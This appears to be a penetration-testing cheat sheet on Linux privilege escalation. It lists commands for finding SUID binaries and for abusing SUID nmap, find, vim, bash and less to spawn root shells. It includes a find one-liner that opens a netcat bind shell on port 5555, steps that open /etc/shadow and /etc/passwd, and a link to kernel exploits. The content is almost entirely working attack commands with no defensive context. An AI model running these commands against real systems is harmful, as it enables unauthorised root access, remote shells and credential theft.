# Linux Privilege Escalation

Check Sudo Access  
`sudo -l`

## SUID Based Privilge Escalation  
### Locating SUIDS
`find . -perm /4000 2>/dev/null`  
`find / -user root -perm -4000 -print 2>/dev/null`  
`find / -perm -u=s -type f 2>/dev/null`  
`find / -user root -perm -4000 -exec ls -ldb {} \;`  

### Exploiting SUIDs

nmap 2.02 - 5.21  
`nmap -V #version check`  

```
nmap --interactive  
nmap> !sh
```

find  
`find <file> -exec <CMD> \;`  
Escalation to root shell  
`find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;`

Vim  
```
vim /etc/shadow  
vim  
# Press ESC key  
:set shell=/bin/sh  
:shell
```

bash  
`bash -p`

less  
```
less /etc/passwd  
!/bin/sh
```

Kernel Exploits  
https://github.com/lucyoa/kernel-exploits

